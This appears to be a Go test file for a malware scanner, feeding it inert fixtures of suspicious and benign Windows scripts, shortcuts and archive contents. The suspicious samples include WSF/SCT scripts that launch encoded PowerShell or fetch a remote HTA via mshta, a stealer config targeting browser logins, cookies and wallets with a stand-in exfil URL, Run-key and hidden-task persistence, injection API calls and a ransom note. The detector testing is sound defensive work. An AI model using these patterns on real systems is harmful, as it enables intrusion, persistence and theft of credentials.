package main

import (
 "archive/zip"
 "bytes"
 "fmt"
 "os"
 "path/filepath"
 "strings"
 "testing"
)

// Every fixture is inert text or a ZIP of inert text. No sample is executed,
// expanded to disk, or run by a shell. All URLs are .invalid test domains.
func TestStage10NewFileFormats(t *testing.T) {
 cases:=[]struct{name,content string; suspicious bool}{
		{"launch.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[var sh = new ActiveXObject(\"WScript.Shell\"); sh.Run(\"powershell -EncodedCommand AAAA\");]]></script></job>", true},
		{"client.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[var sh=WScript.CreateObject(\"WScript.Shell\"); sh.Run(\"mshta https://example.invalid/a.hta\");]]></script></job>", true},
		{"launch.sct", "<scriptlet><script language=\"JScript\"><![CDATA[var sh = new ActiveXObject(\"WScript.Shell\"); sh.Run(\"powershell -EncodedCommand AAAA\");]]></script></scriptlet>", true},
		{"client.sct", "<scriptlet><script language=\"JScript\"><![CDATA[var sh=WScript.CreateObject(\"WScript.Shell\"); sh.Run(\"mshta https://example.invalid/a.hta\");]]></script></scriptlet>", true},
		{"remote.url", "[InternetShortcut]\nURL=file://server/share/launcher.exe\n", true},
		{"remote2.url", "[InternetShortcut]\nURL=file:////server/public/helper.scr\n", true},
		{"remote3.url", "[InternetShortcut]\nURL=file://server/share/task.hta\n", true},
		{"notes.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[WScript.Echo(\"hello\");]]></script></job>", false},
		{"basic.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[var sh = new ActiveXObject(\"WScript.Shell\"); sh.Run(\"notepad.exe\");]]></script></job>", false},
		{"commented.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[// var sh = new ActiveXObject(\"WScript.Shell\"); sh.Run(\"powershell -EncodedCommand AAAA\");\nWScript.Echo(\"ok\");]]></script></job>", false},
		{"notes.sct", "<scriptlet><script language=\"JScript\"><![CDATA[var x=\"WScript.Shell\"; var y=\"powershell -enc\";]]></script></scriptlet>", false},
		{"plain.sct", "<scriptlet><script language=\"JScript\"><![CDATA[WScript.Echo(\"hello\")]]></script></scriptlet>", false},
		{"web.url", "[InternetShortcut]\nURL=https://example.invalid/readme\n", false},
		{"webexe.url", "[InternetShortcut]\nURL=https://example.invalid/latest.exe\n", false},
		{"bookmark.url", "[InternetShortcut]\nURL=file:///C:/Program%20Files/Contoso/readme.txt\n", false},
		{"commented.url", "[InternetShortcut]\n;URL=file://server/share/launcher.exe\nURL=https://example.invalid\n", false},
		{"notremote.url", "[InternetShortcut]\nURL=file://server/docs/handbook.pdf\n", false},
 }
 dir:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 for i,c:=range cases {
  p:=filepath.Join(dir,fmt.Sprintf("%03d",i),c.name)
  if err:=os.MkdirAll(filepath.Dir(p),0700);err!=nil{t.Fatal(err)}
  if err:=os.WriteFile(p,[]byte(c.content),0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  f:=inspectFile(p,st)
  if c.suspicious && f!=nil {tp++} else if c.suspicious {fn++;t.Logf("Missed: %s",c.name)
  } else if f!=nil {fp++;t.Logf("False positive %s: %v",c.name,f.Reasons)
  } else {tn++}
 }
 t.Logf("STAGE10_FORMATS TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
 if fn!=0 || fp!=0 || tp!=7 || tn!=10 {t.Fatalf("format suite failed TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)}
}

func stage10ZipFixture(t *testing.T, name, member, payload string) []byte {
 t.Helper()
 var bytesBuffer bytes.Buffer
 zw:=zip.NewWriter(&bytesBuffer)
 wr,err:=zw.Create(member);if err!=nil{t.Fatal(err)}
 if _,err:=wr.Write([]byte(payload));err!=nil{t.Fatal(err)}
 if err:=zw.Close();err!=nil{t.Fatal(err)}
 return bytesBuffer.Bytes()
}

func TestStage10ArchiveBehaviorInspection(t *testing.T) {
 cases:=[]struct{name,member,content string;suspicious bool}{
		{"task.zip", "boot-task.xml", "<Task><Triggers><BootTrigger/></Triggers><Settings><Hidden>true</Hidden></Settings><Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\Libraries\\worker.exe</Command></Exec></Actions></Task>", true},
		{"registry.zip", "runkey.reg", "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Updater\"=\"C:\\Users\\Public\\worker.exe\"", true},
		{"config.zip", "collector.json", "{\"enabled\":true,\"targets\":[\"Login Data\",\"Cookies\",\"Wallet\"],\"exfil\":{\"url\":\"https://example.invalid/inbox\",\"method\":\"POST\"}}", true},
		{"script-python.zip", "locker.py", "for f in Path(root).rglob(\"*\"):\n    f.write_bytes(cipher.encrypt(b\"example\"))", true},
		{"macro.zip", "autorun.bas", "Sub AutoOpen()\n Shell(\"powershell -NoProfile -File sample.ps1\")\nEnd Sub", true},
		{"api-source.zip", "inject.c", "void demo(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}", true},
		{"ransom-note.zip", "README_RESTORE_FILES.txt", "YOUR DOCUMENTS HAVE BEEN LOCKED\nTo recover everything, send 1 BTC to the wallet listed below.", true},
		{"wsh.zip", "agent.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[var sh = new ActiveXObject(\"WScript.Shell\"); sh.Run(\"powershell -EncodedCommand AAAA\");]]></script></job>", true},
		{"shortcut.zip", "remote.url", "[InternetShortcut]\nURL=file://server/share/agent.exe\n", true},
		{"network-script.zip", "agent.sct", "<scriptlet><script language=\"JScript\"><![CDATA[var sh=WScript.CreateObject(\"WScript.Shell\"); sh.Run(\"mshta https://example.invalid/a.hta\");]]></script></scriptlet>", true},
		{"nested-zip-inner.zip", "nested/loader.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[var sh=WScript.CreateObject(\"WScript.Shell\"); sh.Run(\"mshta https://example.invalid/a.hta\");]]></script></job>", true},
		{"task-clean.zip", "ordinary.xml", "<Task><Triggers><CalendarTrigger/></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Program Files\\Contoso\\backup.exe</Command></Exec></Actions></Task>", false},
		{"registry-clean.zip", "normal.reg", "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"Updater\"=\"C:\\Program Files\\Contoso\\worker.exe\"", false},
		{"config-disabled.zip", "collector.json", "{\"enabled\":false,\"targets\":[\"Login Data\",\"Cookies\",\"Wallet\"],\"exfil\":{\"url\":\"https://example.invalid/inbox\",\"method\":\"POST\"}}", false},
		{"python-mock.zip", "mock.py", "fake_fs={\"note.txt\": b\"hello\"}\nfor n,b in fake_fs.items(): print(n,len(b))", false},
		{"macro-clean.zip", "macro.bas", "Sub AutoOpen()\n Debug.Print \"hello\"\nEnd Sub", false},
		{"disabled-source.zip", "disabled.c", "#if 0\nvoid demo(){OpenProcess(0,0,1);VirtualAllocEx(h,0,16,0,0);WriteProcessMemory(h,p,b,16,0);CreateRemoteThread(h,0,0,0,0,0,0);}\n#endif\nint main(){return 0;}", false},
		{"bookmarks.zip", "shortcut.url", "[InternetShortcut]\nURL=https://example.invalid\n", false},
		{"wsh-innocent.zip", "job.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[WScript.Echo(\"nothing\")]]></script></job>", false},
		{"js-bundle.zip", "bundle.js", "var a=\"XMLHTTP\";var b=\"powershell -enc\";console.log(a,b)", false},
		{"document.zip", "README_README.txt", "This is a safe document describing security awareness.", false},
		{"nested-zip-clean.zip", "nested/notes.wsf", "<?xml version=\"1.0\"?><job id=\"job\"><script language=\"JScript\"><![CDATA[WScript.Echo(\"just examples\")]]></script></job>", false},
 }
 dir:=t.TempDir()
 tp,fn,fp,tn:=0,0,0,0
 for i,c:=range cases {
  path:=filepath.Join(dir,fmt.Sprintf("%02d_%s",i,c.name))
  payload:=[]byte(c.content)
  if strings.HasPrefix(c.name,"nested-zip-") {
   payload=stage10ZipFixture(t,"inner.zip",c.member,c.content)
   c.member="deep.zip"
  }
  var buf bytes.Buffer
  zw:=zip.NewWriter(&buf)
  f,err:=zw.Create(c.member);if err!=nil{t.Fatal(err)}
  if _,err:=f.Write(payload);err!=nil{t.Fatal(err)}
  if err:=zw.Close();err!=nil{t.Fatal(err)}
  if err:=os.WriteFile(path,buf.Bytes(),0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(path);if err!=nil{t.Fatal(err)}
  finding:=inspectFile(path,st)
  if c.suspicious && finding!=nil {tp++} else if c.suspicious {fn++;t.Logf("Missed: %s",c.name)
  } else if finding!=nil {fp++;t.Logf("False positive %s: %v",c.name,finding.Reasons)
  } else {tn++}
 }
 t.Logf("STAGE10_ARCHIVES TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
 if fn!=0 || fp!=0 || tp!=11 || tn!=11 {t.Fatalf("archive suite failed TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)}
}
